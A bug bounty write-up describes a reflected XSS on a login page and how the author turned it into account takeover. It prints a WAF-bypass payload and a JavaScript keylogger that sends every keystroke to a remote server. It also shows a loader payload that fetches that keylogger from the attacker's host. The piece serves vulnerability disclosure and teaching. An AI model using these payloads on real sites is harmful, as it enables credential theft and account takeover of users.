# How I Used Keylogger XSS to Capture Credentials Leading to ATO

- **Source URL:** https://medium.com/@yyaminn/how-i-used-keylogger-xss-to-capture-credentials-leading-to-ato-06593e7a0798?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@yyaminn
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 6595)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hey folks, I'm thrilled to see you all here!

As a bug bounty hunter, I always strive to demonstrate the real and practical impact of my findings, showcasing how they affect the business and its users. To maximize the value of my discoveries, I thoroughly exploit and document them, providing detailed evidence of their severity and potential consequences.

Recently, I discovered a Reflected Cross-Site Scripting (RXSS) weakness on the main login page of one of HackerOne programs that exposes users to ATO. In this write-up, I’ll walk you through How I Used Keylogger XSS to Capture Credentials Leading to ATO and demonstrate the potential consequences of such an attack.

#### The Vulnerability

The RXSS vulnerability lies in the main login page, which allows an attacker to inject malicious JavaScript code. However, the WAF in place posed a challenge, as it removed pure \<script> tags and prevented the use of external JavaScript files via the src attribute.

Through analysis and testing, I bypassed the WAF checks using the following payload:

';\<!\</sc\</script>ript>\<img/src=x onerror=alert(document.cookie)>

This crafted payload allowed me to inject JavaScript code, ultimately leading to the discovery of the RXSS vulnerability.

#### Beyond the Alert Box

After successfully demonstrating the RXSS vulnerability with an alert box, I sought to illustrate its real-world impact by capturing user credentials through a JavaScript keylogger. Leveraging the vulnerability on the main login page, Here’s the code I developed:

**logger.js :**

```
document.onkeypress = function(e) {
    if (typeof k === 'undefined') {
        k = "";
    }
    k = k + String.fromCharCode(e.which);
    fetch("//{Your_Server_address}?k=" + k);
    this.remove();
};
k=""
```
saved it on my VPS under \`logger.js\`.

**Payload:**

Since the WAF is blocking the use of external JavaScript files via the \`src\` attribute, I used $.getScript() to load and run external JavaScript files from my VPS.

`';<!</sc<script>ript><sc<script>ript>$.getScript("//{Your_Server_address}/logger.js")</sc<script>ript><sc<script>ript>`
#### Steps To Reproduce

1. On your public server ,start you HTTP server (for hosting JS keylogger and receiving keystrokes).
2. Open the vulnerable URL with the crafted payload.
3. Log in by entering your username and password into the respective fields.
4. Note that all keystrokes, including the username and password entries, are being captured and sent to the attacker’s server in real-time.

**POC :**

#### Impact

Exploiting this vulnerability allows attackers to intercept and capture sensitive information entered by victims, including usernames, passwords, and other personal data. This can lead to:

- Unauthorized access to compromised accounts, enabling attackers to perform actions such as altering account settings, sending unauthorized messages, or accessing confidential information.
- Propagation of further attacks within the organization or against other users, potentially leading to reputational damage and loss of trust.

#### Conclusion

This recent RXSS finding underscores the vital role of securing user input and validating data. As ethical hackers, identifying and reporting such vulnerabilities is crucial to prevent malicious actors from exploiting them. By doing so, we contribute to a safer digital landscape for everyone.

I hope this write-up provides valuable insights into the world of bug bounty hunting and the importance of security research.

**Coffee & security? Follow me on :**

**LinkedIn**: [https://www.linkedin.com/in/yamin-oraibe-34b02521b/](https://www.linkedin.com/in/yamin-oraibe-34b02521b/)

**Twitter** : [https://twitter.com/yyaminn\_](https://twitter.com/yyaminn_)
